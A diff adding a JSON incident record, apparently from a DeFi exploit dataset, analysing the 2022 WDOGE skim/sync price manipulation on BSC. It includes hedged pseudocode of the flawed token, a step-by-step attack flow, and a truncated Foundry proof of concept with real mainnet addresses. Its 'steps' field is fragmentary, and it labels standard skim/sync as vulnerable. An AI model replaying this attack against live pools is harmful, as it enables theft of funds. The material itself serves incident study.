@@ -1,0 +1,29 @@
+{
+ "id": "2022__2022-04-09_Wdoge_SkimSyncPriceManipulation",
+ "source_file": "2022/2022-04-09_Wdoge_SkimSyncPriceManipulation.md",
+ "title": "WDOGE — skim/sync Price Manipulation Attack Analysis",
+ "date": "2022-04-09",
+ "protocol": "WDOGE",
+ "chain": "BSC",
+ "loss_raw": "~$2,900 WBNB or more (exact amount undisclosed)",
+ "loss_usd": 2900.0,
+ "root_cause": "A flaw in the WDOGE token contract's internal transfer logic allows manipulation of the WDOGE/WBNB LP pool's price ratio by combining `skim()` and `sync()`",
+ "attack_tx": "Block 17,248,705",
+ "vulnerable_contract": "WDOGE/WBNB Pair 0xB3e708a6d1221ed7C58B88622FDBeE2c03e4DB4d",
+ "classes": [
+  "oracle-price-manipulation"
+ ],
+ "code_before": [
+  "// skim/sync mechanism explanation (Uniswap V2 based)\ncontract UniswapV2Pair {\n    uint112 private reserve0;\n    uint112 private reserve1;\n\n    // ❌ skim: transfers surplus when actual balance > reserve\n    // WDOGE transfer flaw causes actual balance to shift unexpectedly\n    function skim(address to) external lock {\n        address _token0 = token0;\n        address _token1 = token1;\n        _safeTransfer(_token0, to, IERC20(_token0).balanceOf(address(this)) - reserve0);\n        _safeTransfer(_token1, to, IERC20(_token1).balanceOf(address(this)) - reserve1);\n    }\n\n    // sync: force-updates reserve to current balance\n    function sync() external lock {\n        _update(\n            IERC20(token0).balanceOf(address(this)),\n            IERC20(token1).balanceOf(address(this)),\n            reserve0,\n            reserve1\n        );\n    }\n}\n\n// WDOGE token internal transfer bug (pseudocode)\ncontract WDOGE {\n    // ❌ Fee deduction method or rebase logic error on transfer\n    // Flaw causes actual transferred amount to differ from pool balance\n    function transfer(address to, uint256 amount) external returns (bool) {\n        // ❌ After internal processing, actual delivered amount differs from amount\n        uint256 actualAmount = amount - _getFee(amount);\n        _balances[msg.sender] -= amount;    // ❌ Deducts full amount\n        _balances[to] += actualAmount;      // Delivers amount minus fee\n        // → When WDOGE is extracted from the pool via skim, the fee difference can be repeatedly extracted\n        return true;\n    }\n}",
+  "// ❌ Root cause: A flaw in the WDOGE token contract's internal transfer logic allows manipulation of the WDOGE/WBNB LP pool's price ratio by combining `skim()` and `sync()`\n    function skim(address arg0) external {}  // 0xbc25cf77  // ❌ Vulnerable\n\n    function sync() external {}  // 0xfff6cae9  // ❌ Vulnerable"
+ ],
+ "code_after": [],
+ "steps": [
+  "Actual balance > reserve → collect surplus",
+  "→ Price ratio altered"
+ ],
+ "other_code": [
+  "Attacker\n    │\n    ├─[1] Flash swap: Borrow 2,900 WBNB (BUSD/WBNB Pair)\n    │\n    ├─[2] [Inside pancakeCall]\n    │       Transfer 2,900 WBNB to WDOGE/WBNB pool\n    │\n    ├─[3] WDOGE/WBNB Pair.swap(large amount of WDOGE, 0, address(this), \"\")\n    │       Receive WDOGE in exchange for WBNB input\n    │\n    ├─[4] Transfer received WDOGE back to Pair\n    │       ⚡ WDOGE transfer flaw causes balance inconsistency\n    │\n    ├─[5] Pair.skim(address(this))\n    │       Actual balance > reserve → collect surplus\n    │\n    ├─[6] Pair.sync()\n    │       Update reserve to new balance\n    │       → Price ratio altered\n    │\n    ├─[7] Repeat or realize profit via WBNB swap\n    │\n    └─[8] Repay flash swap: 2,908 WBNB\n            Net profit: ~(actual received - 2,908) WBNB",
+  "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.10;\n\nimport \"forge-std/Test.sol\";\n\ninterface IPancakePair {\n    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;\n    function skim(address to) external;\n    function sync() external;\n    function getReserves() external view returns (uint112, uint112, uint32);\n}\n\ncontract ContractTest is Test {\n    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);\n    IERC20 BUSD = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);\n    IERC20 WDOGE = IERC20(0x46bA8a59f4863Bd20a066Fd985B163235425B5F9);\n\n    IPancakePair wdogeWbnbPair = IPancakePair(0xB3e708a6d1221ed7C58B88622FDBeE2c03e4DB4d);\n    IPancakePair busdWbnbPair  = IPancakePair(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);\n\n    funct"
+ ]
+}
